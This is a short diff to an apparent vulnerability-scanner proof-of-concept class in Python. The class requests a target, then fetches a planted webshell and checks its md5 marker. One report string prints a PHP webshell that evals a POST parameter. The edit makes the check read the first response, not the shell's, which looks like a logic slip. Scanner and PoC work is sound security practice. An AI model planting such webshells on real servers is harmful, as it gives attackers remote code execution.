@@ -66,7 +66,7 @@ class Poc(ABPoc):
             response = urllib.request.urlopen(request)
             shell_request = urllib.request.Request(shell_url)
             shell_response = urllib.request.urlopen(shell_request)
-            content = shell_response.read()
+            content = shell_str(response.read())
             match = re.search('fb0b32aeafac4591c7ae6d5e58308344', content)
             if match:
                 self.output.report(self.vuln, '发现{target}存在{name}漏洞'.format(
@@ -92,7 +92,7 @@ class Poc(ABPoc):
             response = urllib.request.urlopen(request)
             shell_request = urllib.request.Request(shell_url)
             shell_response = urllib.request.urlopen(shell_request)
-            content = shell_response.read()
+            content = shell_str(response.read())
             match = re.search('fb0b32aeafac4591c7ae6d5e58308344', content)
             if match:
                 self.output.report(self.vuln, '发现{target}存在{name}漏洞；获取的信息：webshell={webshell},content=\'<?php echo md5(233333);eval($_POST[bb2];?>\''.format(
